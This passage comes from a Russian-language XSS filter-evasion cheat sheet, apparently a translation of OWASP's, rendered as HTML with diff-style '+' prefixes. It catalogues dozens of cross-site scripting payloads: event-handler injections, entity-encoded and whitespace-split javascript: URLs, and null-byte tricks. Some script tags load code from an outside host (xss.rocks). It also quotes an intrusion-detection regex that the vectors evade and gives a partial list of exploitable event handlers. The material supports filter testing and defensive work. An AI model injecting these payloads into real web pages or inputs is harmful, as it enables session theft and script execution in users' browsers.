+<p>Chrome автоматически вставляет недостающие кавычки. Если возникают проблемы, попробуйте опустить их — Chrome корректно расставит недостающие кавычки в URL или скриптах:</p>
+<div class="highlight"><pre><span></span><code><span class="err">\</span><span class="o">&lt;</span><span class="nx">a</span><span class="w"> </span><span class="nx">onmouseover</span><span class="o">=</span><span class="nx">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">)</span><span class="err">\</span><span class="o">&gt;</span><span class="nx">xxs</span><span class="w"> </span><span class="nx">link</span><span class="err">\</span><span class="o">&lt;</span><span class="err">/a\&gt;</span>
+</code></pre></div>
+<p>(Предложено David Cross, проверено в Chrome)</p>
+<h3 id="img">Некорректные теги IMG<a class="headerlink" href="#img" title="Permanent link">&para;</a></h3>
+<p>Этот XSS-метод использует упрощённый движок рендеринга для создания XSS-вектора внутри тега IMG (который должен быть заключён в кавычки). Предполагается, что изначально такой подход был призван исправлять небрежно написанный код, однако он также значительно усложняет корректный разбор HTML-тегов:</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">IMG</span> <span class="err">&quot;&quot;&quot;</span><span class="p">&gt;&lt;</span><span class="nt">SCRIPT</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="s2">&quot;XSS&quot;</span><span class="p">)&lt;/</span><span class="nt">SCRIPT</span><span class="p">&gt;</span>&quot;\&gt;
+</code></pre></div>
+<p>(Изначально найдено Begeek, но было приведено в порядок и сокращено для работы во всех браузерах)</p>
+<h3 id="fromcharcode">fromCharCode<a class="headerlink" href="#fromcharcode" title="Permanent link">&para;</a></h3>
+<p>Если система не допускает кавычки любого вида, можно воспользоваться <code>eval()</code> с <code>fromCharCode</code> в JavaScript для создания любого необходимого XSS-вектора:</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;javascript:alert(String.fromCharCode(88,83,83))&quot;</span><span class="p">&gt;</span>Click Me!<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+</code></pre></div>
+<h3 id="src-src">Тег SRC по умолчанию для обхода фильтров, проверяющих домен SRC<a class="headerlink" href="#src-src" title="Permanent link">&para;</a></h3>
+<p>Эта атака обходит большинство фильтров по домену SRC. Внедрение JavaScript через обработчик события применимо к любому типу HTML-тегов, включая Form, Iframe, Input, Embed и другие. Это также позволяет заменять любое подходящее событие для данного типа тега, например <code>onblur</code> или <code>onclick</code>, предоставляя широкое разнообразие вариантов внедрений:</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">IMG</span> <span class="na">SRC</span><span class="o">=</span><span class="s">#</span> <span class="na">onmouseover</span><span class="o">=</span><span class="s">&quot;alert(&#39;xxs&#39;)&quot;</span><span class="p">&gt;</span>
+</code></pre></div>
+<p>(Предложено David Cross, отредактировано Abdullah Hussam)</p>
+<h3 id="src">Тег SRC по умолчанию с пустым значением<a class="headerlink" href="#src" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">IMG</span> <span class="na">SRC</span><span class="o">=</span> <span class="s">onmouseover=&quot;alert(&#39;xxs&#39;)&quot;</span><span class="p">&gt;</span>
+</code></pre></div>
+<h3 id="src_1">Тег SRC по умолчанию полностью без значения<a class="headerlink" href="#src_1" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">IMG</span> <span class="na">onmouseover</span><span class="o">=</span><span class="s">&quot;alert(&#39;xxs&#39;)&quot;</span><span class="p">&gt;</span>
+</code></pre></div>
+<h3 id="alert">Alert при ошибке<a class="headerlink" href="#alert" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">IMG</span> <span class="na">SRC</span><span class="o">=</span><span class="s">/</span> <span class="na">onerror</span><span class="o">=</span><span class="s">&quot;alert(String.fromCharCode(88,83,83))&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">img</span><span class="p">&gt;</span>
+</code></pre></div>
+<h3 id="img-onerror-javascript-alert">IMG onerror с кодированием JavaScript Alert<a class="headerlink" href="#img-onerror-javascript-alert" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">x</span> <span class="na">onerror</span><span class="o">=</span><span class="s">&quot;&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&quot;</span><span class="p">&gt;</span>
+</code></pre></div>
+<h3 id="html-">Десятичные HTML-ссылки на символы<a class="headerlink" href="#html-" title="Permanent link">&para;</a></h3>
+<p>Поскольку XSS-примеры, использующие директиву <code>javascript:</code> внутри тега <code>&lt;IMG</code>, не работают в Firefox, этот подход использует десятичные HTML-ссылки на символы в качестве обходного решения:</p>
+<div class="highlight"><pre><span></span><code> <span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&quot;</span><span class="p">&gt;</span>Click Me!<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+</code></pre></div>
+<h3 id="html-_1">Десятичные HTML-ссылки на символы без завершающей точки с запятой<a class="headerlink" href="#html-_1" title="Permanent link">&para;</a></h3>
+<p>Это часто эффективно для обхода XSS-фильтров, ищущих строку <code>&amp;\#XX;</code>, поскольку большинство людей не знают о дополнении нулями — которое может применяться до 7 цифр включительно. Это также полезно против фильтров, декодирующих строки вроде <code>$tmp\_string =\~ s/.\*\\&amp;\#(\\d+);.\*/$1/;</code>, ошибочно предполагающих, что точка с запятой обязательна для завершения HTML-закодированной строки (такое встречалось на практике):</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041&quot;</span><span class="p">&gt;</span>Click Me<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+</code></pre></div>
+<h3 id="html-_2">Шестнадцатеричные HTML-ссылки на символы без завершающей точки с запятой<a class="headerlink" href="#html-_2" title="Permanent link">&para;</a></h3>
+<p>Эта атака также работает против фильтра строки <code>$tmp\_string=\~ s/.\*\\&amp;\#(\\d+);.\*/$1/;</code>, поскольку он предполагает, что за символом решётки следует цифра — что неверно для шестнадцатеричных HTML-символов:</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&quot;</span><span class="p">&gt;</span>Click Me<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+</code></pre></div>
+<h3 id="_3">Встроенная табуляция<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
+<p>Этот подход разрывает XSS-атаку:</p>
+<!-- markdownlint-disable MD010-->
+<div class="highlight"><pre><span></span><code> <span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;jav   ascript:alert(&#39;XSS&#39;);&quot;</span><span class="p">&gt;</span>Click Me<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+</code></pre></div>
+<!-- markdownlint-enable MD010-->
+
+<h3 id="_4">Встроенная закодированная табуляция<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<p>Этот подход также может разрывать XSS:</p>
+<div class="highlight"><pre><span></span><code> <span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;jav&amp;#x09;ascript:alert(&#39;XSS&#39;);&quot;</span><span class="p">&gt;</span>Click Me<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+</code></pre></div>
+<h3 id="xss">Встроенный перевод строки для разрыва XSS<a class="headerlink" href="#xss" title="Permanent link">&para;</a></h3>
+<p>Хотя некоторые защитники утверждают, что для этой атаки подойдут любые символы с кодами 09–13 (десятичные), это неверно. Работают только 09 (горизонтальная табуляция), 10 (перевод строки) и 13 (возврат каретки). Для справки см. <a href="https://man7.org/linux/man-pages/man7/ascii.7.html">таблицу ASCII</a>. Следующие четыре примера XSS-атак иллюстрируют этот вектор:</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;jav&amp;#x0A;ascript:alert(&#39;XSS&#39;);&quot;</span><span class="p">&gt;</span>Click Me<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+</code></pre></div>
+<h4 id="1-xss-">Пример 1: разрыв XSS-атаки с помощью встроенного возврата каретки<a class="headerlink" href="#1-xss-" title="Permanent link">&para;</a></h4>
+<p>(Замечание: в приведённых выше примерах строки намеренно длиннее необходимого, поскольку нули можно опускать. Часто встречаются фильтры, предполагающие, что шестнадцатеричное и десятичное кодирование должно содержать два или три символа. Фактическое правило — от 1 до 7 символов.):</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;jav&amp;#x0D;ascript:alert(&#39;XSS&#39;);&quot;</span><span class="p">&gt;</span>Click Me<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+</code></pre></div>
+<h4 id="2-javascript-">Пример 2: разрыв JavaScript-директивы с помощью нулевого символа<a class="headerlink" href="#2-javascript-" title="Permanent link">&para;</a></h4>
+<p>Нулевые символы также работают как XSS-векторы, но иначе, чем в примере выше: их нужно вставлять напрямую — например, через Burp Proxy, или используя <code>%00</code> в строке URL. Если вы хотите написать собственный инструмент для внедрения, можно воспользоваться vim (<code>^V^@</code> создаст нулевой символ) или следующей программой для записи в текстовый файл. Нулевой символ <code>%00</code> значительно полезнее и помог мне обойти ряд реальных фильтров с вариациями этого примера:</p>
+<div class="highlight"><pre><span></span><code>perl<span class="w"> </span>-e<span class="w"> </span><span class="s1">&#39;print &quot;&lt;IMG SRC=java\0script:alert(\&quot;XSS\&quot;)&gt;&quot;;&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>out
+</code></pre></div>
+<h4 id="3-javascript-xss">Пример 3: пробелы и мета-символы перед JavaScript в изображениях для XSS<a class="headerlink" href="#3-javascript-xss" title="Permanent link">&para;</a></h4>
+<p>Это полезно, если шаблон фильтра не учитывает пробелы в слове <code>javascript:</code>, что корректно, поскольку это не отрисуется, но приводит к ошибочному предположению, что между кавычкой и ключевым словом <code>javascript:</code> не может быть пробела. На самом деле допустим любой символ с десятичным кодом от 1 до 32:</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot; &amp;#14;  javascript:alert(&#39;XSS&#39;);&quot;</span><span class="p">&gt;</span>Click Me<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+</code></pre></div>
+<h4 id="4-xss-">Пример 4: XSS без буквенно-цифровых символов<a class="headerlink" href="#4-xss-" title="Permanent link">&para;</a></h4>
+<p>Парсер HTML в Firefox считает, что символ, не являющийся буквой или цифрой, после ключевого слова HTML недопустим, и поэтому воспринимает его как пробел или недопустимый токен после HTML-тега. Проблема в том, что некоторые XSS-фильтры предполагают, что искомый тег разделён пробелами. Например, <code>\&lt;SCRIPT\\s</code> != <code>\&lt;SCRIPT/XSS\\s</code>:</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">SCRIPT</span><span class="err">/</span><span class="na">XSS</span> <span class="na">SRC</span><span class="o">=</span><span class="s">&quot;http://xss.rocks/xss.js&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">SCRIPT</span><span class="p">&gt;</span>
+</code></pre></div>
+<p>Основываясь на той же идее, но расширяя её с помощью фаззера Rsnake. Движок рендеринга Gecko допускает любой символ, кроме букв, цифр и символов-ограничителей (таких как кавычки, угловые скобки и т. д.), между обработчиком события и знаком равенства, что упрощает обход блокировок межсайтового скриптинга. Обратите внимание, что это также относится к символу обратного апострофа, как показано здесь:</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">BODY</span> <span class="na">onload</span><span class="err">!#$%&amp;()*~+</span><span class="na">-_</span><span class="err">.,</span><span class="na">:</span><span class="err">;?@[/|\]^`=</span><span class="na">alert</span><span class="err">(&quot;</span><span class="na">XSS</span><span class="err">&quot;)</span><span class="p">&gt;</span>
+</code></pre></div>
+<p>Yair Amit отметил, что между движками рендеринга Trident (IE) и Gecko (Firefox) есть небольшое различие в поведении, позволяющее использовать просто косую черту между тегом и параметром без пробелов. Это может быть полезно в атаке, если система не допускает пробелы:</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">SCRIPT</span><span class="err">/</span><span class="na">SRC</span><span class="o">=</span><span class="s">&quot;http://xss.rocks/xss.js&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">SCRIPT</span><span class="p">&gt;</span>
+</code></pre></div>
+<h3 id="_5">Лишние открывающие угловые скобки<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<p>Этот XSS-вектор способен обмануть определённые движки обнаружения, которые работают путём поиска совпадающих пар открывающих и закрывающих угловых скобок с последующим сравнением тега внутри, вместо использования более эффективного алгоритма, такого как <a href="https://en.wikipedia.org/wiki/Boyer%E2%80%93Moore_string-search_algorithm">Boyer-Moore</a>, ищущего полные совпадения строк для открывающей угловой скобки и связанного тега (разумеется, после деобфускации). Двойной слэш комментирует завершающую лишнюю скобку, подавляя ошибку JavaScript:</p>
+<div class="highlight"><pre><span></span><code><span class="err">&lt;</span><span class="p">&lt;</span><span class="nt">SCRIPT</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="s2">&quot;XSS&quot;</span><span class="p">);</span><span class="c1">//\&lt;</span><span class="p">&lt;/</span><span class="nt">SCRIPT</span><span class="p">&gt;</span>
+</code></pre></div>
+<p>(Предложено Franz Sedlmaier)</p>
+<h3 id="script">Отсутствие закрывающих тегов script<a class="headerlink" href="#script" title="Permanent link">&para;</a></h3>
+<p>В Firefox часть <code>\&gt;&lt;/SCRIPT&gt;</code> этого XSS-вектора на самом деле не нужна, поскольку Firefox предполагает, что безопасно закрыть HTML-тег, и добавляет закрывающие теги самостоятельно. В отличие от следующей атаки, которая не работает в Firefox, этот метод не требует дополнительного HTML-кода ниже по документу. При необходимости можно добавить кавычки, но обычно они не нужны:</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">SCRIPT</span> <span class="na">SRC</span><span class="o">=</span><span class="s">http://xss.rocks/xss.js?&lt;</span> <span class="na">B</span> <span class="p">&gt;</span>
+</code></pre></div>
+<h3 id="script_1">Разрешение протокола в тегах script<a class="headerlink" href="#script_1" title="Permanent link">&para;</a></h3>
+<p>Этот конкретный вариант частично основан на обходе разрешения протокола от Ozh (описан ниже) и работает в IE и Edge в режиме совместимости. Однако он особенно полезен, когда важна экономия места, и, конечно, чем короче ваш домен, тем лучше. Расширение <code>.j</code> допустимо независимо от типа кодирования, поскольку браузер понимает его в контексте тега SCRIPT:</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">SCRIPT</span> <span class="na">SRC</span><span class="o">=</span><span class="s">//xss.rocks/.j</span><span class="p">&gt;</span>
+</code></pre></div>
+<p>(Предложено Łukasz Pilorz)</p>
+<h3 id="htmljavascript-xss-">Полуоткрытый HTML/JavaScript XSS-вектор<a class="headerlink" href="#htmljavascript-xss-" title="Permanent link">&para;</a></h3>
+<p>В отличие от Firefox, движок рендеринга IE (Trident) не добавляет лишние данные на страницу, но допускает директиву <code>javascript:</code> в изображениях. Это полезно как вектор, поскольку не требует закрывающей угловой скобки. Предполагается наличие какого-либо HTML-тега ниже точки внедрения этого XSS-вектора. Даже при отсутствии закрывающего тега <code>\&gt;</code> теги ниже по документу закроют его. Примечание: это может нарушить HTML в зависимости от того, что находится ниже. Вектор обходит следующее регулярное выражение системы обнаружения сетевых вторжений (NIDS): <code>/((\\%3D)|(=))\[^\\n\]\*((\\%3C)|\&lt;)\[^\\n\]+((\\%3E)|\&gt;)/</code> — поскольку не требует завершающего <code>\&gt;</code>. Как дополнительное замечание: этот вектор также был эффективен против реального XSS-фильтра с использованием незакрытого тега <code>&lt;IFRAME</code> вместо тега <code>&lt;IMG</code>.</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">IMG</span> <span class="na">SRC</span><span class="o">=</span><span class="s">&quot;`&lt;javascript:alert&gt;`(&#39;XSS&#39;)&quot;</span>
+</code></pre></div>
+<h3 id="javascript-">Экранирование JavaScript-экранирования<a class="headerlink" href="#javascript-" title="Permanent link">&para;</a></h3>
+<p>Если приложение написано так, что выводит пользовательские данные внутрь JavaScript (например: <code>&lt;SCRIPT&gt;var a="$ENV{QUERY\_STRING}";&lt;/SCRIPT&gt;</code>) и вы хотите внедрить туда свой JavaScript, но серверное приложение экранирует определённые кавычки, можно обойти это, экранировав их символ экранирования. При внедрении это будет выглядеть как <code>&lt;SCRIPT&gt;var a="\\\\";alert('XSS');//";&lt;/SCRIPT&gt;</code>, что в итоге снимает экранирование с двойных кавычек и приводит к срабатыванию XSS-вектора. XSS-локатор использует этот метод:</p>
+<div class="highlight"><pre><span></span><code><span class="err">\&quot;</span><span class="p">;</span><span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;XSS&#39;</span><span class="p">);</span><span class="c1">//</span>
+</code></pre></div>
+<p>Альтернативный вариант — если к встроенным данным применено корректное экранирование JSON или JavaScript, но не HTML-кодирование — завершить блок скрипта и начать свой:</p>
+<div class="highlight"><pre><span></span><code><span class="o">&lt;</span><span class="err">/script&gt;&lt;script&gt;alert(&#39;XSS&#39;);&lt;/script&gt;</span>
+</code></pre></div>
+<h3 id="title">Закрывающий тег TITLE<a class="headerlink" href="#title" title="Permanent link">&para;</a></h3>
+<p>Это простой XSS-вектор, закрывающий теги <code>&lt;TITLE&gt;</code>, которые могут инкапсулировать вредоносную XSS-атаку:</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;/</span><span class="nt">TITLE</span><span class="p">&gt;&lt;</span><span class="nt">SCRIPT</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="s2">&quot;XSS&quot;</span><span class="p">);&lt;/</span><span class="nt">SCRIPT</span><span class="p">&gt;</span>
+</code></pre></div>
+<h4 id="input-image">INPUT Image<a class="headerlink" href="#input-image" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">INPUT</span> <span class="na">TYPE</span><span class="o">=</span><span class="s">&quot;IMAGE&quot;</span> <span class="na">SRC</span><span class="o">=</span><span class="s">&quot;javascript:alert(&#39;XSS&#39;);&quot;</span><span class="p">&gt;</span>
+</code></pre></div>
+<h4 id="body-image">BODY Image<a class="headerlink" href="#body-image" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">BODY</span> <span class="na">BACKGROUND</span><span class="o">=</span><span class="s">&quot;javascript:alert(&#39;XSS&#39;)&quot;</span><span class="p">&gt;</span>
+</code></pre></div>
+<h4 id="img-dynsrc">IMG Dynsrc<a class="headerlink" href="#img-dynsrc" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">IMG</span> <span class="na">DYNSRC</span><span class="o">=</span><span class="s">&quot;javascript:alert(&#39;XSS&#39;)&quot;</span><span class="p">&gt;</span>
+</code></pre></div>
+<h4 id="img-lowsrc">IMG Lowsrc<a class="headerlink" href="#img-lowsrc" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">IMG</span> <span class="na">LOWSRC</span><span class="o">=</span><span class="s">&quot;javascript:alert(&#39;XSS&#39;)&quot;</span><span class="p">&gt;</span>
+</code></pre></div>
+<h3 id="list-style-image">List-style-image<a class="headerlink" href="#list-style-image" title="Permanent link">&para;</a></h3>
+<p>Эта экзотическая атака направлена на встраивание изображений для маркированных списков. Она работает только в движке рендеринга IE из-за использования JavaScript-директивы. Не особенно полезный XSS-вектор:</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">STYLE</span><span class="p">&gt;</span><span class="nt">li</span><span class="w"> </span><span class="p">{</span><span class="k">list-style-image</span><span class="p">:</span><span class="w"> </span><span class="nb">url</span><span class="p">(</span><span class="s2">&quot;javascript:alert(&#39;XSS&#39;)&quot;</span><span class="p">);}&lt;/</span><span class="nt">STYLE</span><span class="p">&gt;&lt;</span><span class="nt">UL</span><span class="p">&gt;&lt;</span><span class="nt">LI</span><span class="p">&gt;</span>XSS<span class="p">&lt;/</span><span class="nt">br</span><span class="p">&gt;</span>
+</code></pre></div>
+<h3 id="vbscript">VBscript в изображении<a class="headerlink" href="#vbscript" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">IMG</span> <span class="na">SRC</span><span class="o">=</span><span class="s">&#39;vbscript:msgbox(&quot;XSS&quot;)&#39;</span><span class="p">&gt;</span>
+</code></pre></div>
+<h3 id="svg-object">Тег SVG Object<a class="headerlink" href="#svg-object" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="o">&lt;</span><span class="nx">svg</span><span class="o">/</span><span class="nx">onload</span><span class="o">=</span><span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;XSS&#39;</span><span class="p">)</span><span class="o">&gt;</span>
+</code></pre></div>
+<h3 id="ecmascript-6">ECMAScript 6<a class="headerlink" href="#ecmascript-6" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="nb">Set</span><span class="p">.</span><span class="kr">constructor</span><span class="sb">`alert\x28document.domain\x29</span>
+</code></pre></div>
+<h3 id="body">Тег BODY<a class="headerlink" href="#body" title="Permanent link">&para;</a></h3>
+<p>Эта атака не требует использования каких-либо вариантов <code>javascript:</code> или <code>&lt;SCRIPT...</code> для осуществления XSS-атаки. Дэн Краули отметил, что перед знаком равенства можно поставить пробел (<code>onload=</code> != <code>onload =</code>):</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">BODY</span> <span class="na">ONLOAD</span><span class="o">=</span><span class="s">alert(&#39;XSS&#39;)</span><span class="p">&gt;</span>
+</code></pre></div>
+<h4 id="_6">Атаки с использованием обработчиков событий<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h4>
+<p>Атака с тегом BODY может быть модифицирована для использования в аналогичных XSS-атаках (это наиболее полный список в сети на момент написания данного документа). Благодарим Rene Ledosquet за обновления HTML+TIME.</p>
+<p>В <a href="http://help.dottoro.com/">Dottoro Web Reference</a> также есть хороший <a href="http://help.dottoro.com/ljfvvdnm.php">список событий в JavaScript</a>.</p>
+<ul>
+<li><code>onAbort()</code> (когда пользователь прерывает загрузку изображения)</li>
+<li><code>onActivate()</code> (когда объект установлен как активный элемент)</li>
+<li><code>onAfterPrint()</code> (срабатывает после того, как пользователь напечатал или просмотрел задание на печать)</li>
+<li><code>onAfterUpdate()</code> (срабатывает на объекте данных после обновления данных в исходном объекте)</li>
+<li><code>onBeforeActivate()</code> (срабатывает перед установкой объекта в качестве активного элемента)</li>
+<li><code>onBeforeCopy()</code> (злоумышленник выполняет строку атаки непосредственно перед копированием выделенного в буфер обмена — это можно сделать с помощью функции <code>execCommand("Copy")</code>)</li>
+<li><code>onBeforeCut()</code> (злоумышленник выполняет строку атаки непосредственно перед вырезанием выделенного)</li>
+<li><code>onBeforeDeactivate()</code> (срабатывает сразу после изменения activeElement с текущего объекта)</li>
+<li><code>onBeforeEditFocus()</code> (срабатывает перед тем, как объект внутри редактируемого элемента переходит в состояние с активным UI, или когда редактируемый контейнерный объект выбирается элементом управления)</li>
+<li><code>onBeforePaste()</code> (пользователя нужно обманом вынудить вставить данные или принудить с помощью функции <code>execCommand("Paste")</code>)</li>
+<li><code>onBeforePrint()</code> (пользователя нужно обманом вынудить печатать или злоумышленник может использовать функцию <code>print()</code> или <code>execCommand("Print")</code>)</li>
+<li><code>onBeforeUnload()</code> (пользователя нужно обманом вынудить закрыть браузер — злоумышленник не может выгружать окна, если только они не были порождены родительским окном)</li>
+<li><code>onBeforeUpdate()</code> (срабатывает на объекте данных перед обновлением данных в исходном объекте)</li>
+<li><code>onBegin()</code> (событие onbegin срабатывает сразу при начале временно́й шкалы элемента)</li>
+<li><code>onBlur()</code> (в случае загрузки другого всплывающего окна и потери фокуса)</li>
+<li><code>onBounce()</code> (срабатывает, когда свойство behavior объекта marquee установлено в "alternate" и содержимое бегущей строки достигает одной из сторон окна)</li>
+<li><code>onCellChange()</code> (срабатывает при изменении данных в источнике данных)</li>
+<li><code>onChange()</code> (поле select, text или TEXTAREA теряет фокус и его значение изменилось)</li>
+<li><code>onClick()</code> (кто-то нажимает на форму)</li>
+<li><code>onContextMenu()</code> (пользователю нужно кликнуть правой кнопкой мыши в области атаки)</li>
+<li><code>onControlSelect()</code> (срабатывает, когда пользователь собирается выполнить управляющее выделение объекта)</li>
+<li><code>onCopy()</code> (пользователю нужно что-то скопировать или это можно эксплуатировать с помощью команды <code>execCommand("Copy")</code>)</li>
+<li><code>onCut()</code> (пользователю нужно что-то скопировать или это можно эксплуатировать с помощью команды <code>execCommand("Cut")</code>)</li>
+<li><code>onDataAvailable()</code> (пользователю нужно изменить данные в элементе, или злоумышленник может выполнить то же действие)</li>
+<li><code>onDataSetChanged()</code> (срабатывает при изменении набора данных, предоставляемого объектом-источником данных)</li>
+<li><code>onDataSetComplete()</code> (срабатывает, сигнализируя о том, что все данные доступны из объекта-источника данных)</li>
+<li><code>onDblClick()</code> (пользователь дважды кликает на элемент формы или ссылку)</li>
+<li><code>onDeactivate()</code> (срабатывает при изменении activeElement с текущего объекта на другой объект в родительском документе)</li>
+<li><code>onDrag()</code> (требует, чтобы пользователь перетаскивал объект)</li>
+<li><code>onDragEnd()</code> (требует, чтобы пользователь перетаскивал объект)</li>
+<li><code>onDragLeave()</code> (требует, чтобы пользователь перетащил объект за пределы допустимой области)</li>
+<li><code>onDragEnter()</code> (требует, чтобы пользователь перетащил объект в допустимую область)</li>
+<li><code>onDragOver()</code> (требует, чтобы пользователь перетащил объект в допустимую область)</li>
+<li><code>onDragDrop()</code> (пользователь бросает объект (например, файл) в окно браузера)</li>
+<li><code>onDragStart()</code> (происходит при начале операции перетаскивания)</li>
+<li><code>onDrop()</code> (пользователь бросает объект (например, файл) в окно браузера)</li>
+<li><code>onEnd()</code> (событие onEnd срабатывает при завершении временно́й шкалы)</li>
+<li><code>onError()</code> (загрузка документа или изображения вызывает ошибку)</li>
+<li><code>onErrorUpdate()</code> (срабатывает на связанном с данными объекте при возникновении ошибки во время обновления связанных данных в объекте-источнике данных)</li>
+<li><code>onFilterChange()</code> (срабатывает при завершении изменения состояния визуального фильтра)</li>
+<li><code>onFinish()</code> (злоумышленник может создать эксплойт после завершения цикла бегущей строки)</li>
+<li><code>onFocus()</code> (злоумышленник выполняет строку атаки при получении окном фокуса)</li>
+<li><code>onFocusIn()</code> (злоумышленник выполняет строку атаки при получении окном фокуса)</li>
+<li><code>onFocusOut()</code> (злоумышленник выполняет строку атаки при потере окном фокуса)</li>
+<li><code>onHashChange()</code> (срабатывает при изменении части идентификатора фрагмента в текущем адресе документа)</li>
+<li><code>onHelp()</code> (злоумышленник выполняет строку атаки, когда пользователь нажимает F1, пока окно в фокусе)</li>
+<li><code>onInput()</code> (текстовое содержимое элемента изменяется через пользовательский интерфейс)</li>
+<li><code>onKeyDown()</code> (пользователь нажимает клавишу)</li>
+<li><code>onKeyPress()</code> (пользователь нажимает или удерживает клавишу)</li>
+<li><code>onKeyUp()</code> (пользователь отпускает клавишу)</li>
+<li><code>onLayoutComplete()</code> (пользователю нужно распечатать или выполнить предварительный просмотр печати)</li>
+<li><code>onLoad()</code> (злоумышленник выполняет строку атаки после загрузки окна)</li>
+<li><code>onLoseCapture()</code> (может быть эксплуатировано методом <code>releaseCapture()</code>)</li>
+<li><code>onMediaComplete()</code> (при использовании потокового медиафайла это событие может сработать до начала воспроизведения файла)</li>
+<li><code>onMediaError()</code> (пользователь открывает в браузере страницу с медиафайлом, и событие срабатывает при возникновении проблемы)</li>
+<li><code>onMessage()</code> (срабатывает при получении документом сообщения)</li>
+<li><code>onMouseDown()</code> (злоумышленнику нужно заставить пользователя кликнуть на изображение)</li>
